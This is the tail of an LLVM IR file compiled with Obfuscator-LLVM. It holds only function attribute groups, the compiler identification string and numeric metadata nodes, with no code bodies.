attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146541122}
!2 = !{i32 -2146540429}
!3 = !{i32 -2146539624}
!4 = !{i32 -2146538867}
!5 = !{i32 -2146538147}
!6 = !{i32 -2146537205}
!7 = !{i32 -2146535726}
!8 = !{i32 -2146535009}
!9 = !{i32 -2146534171}
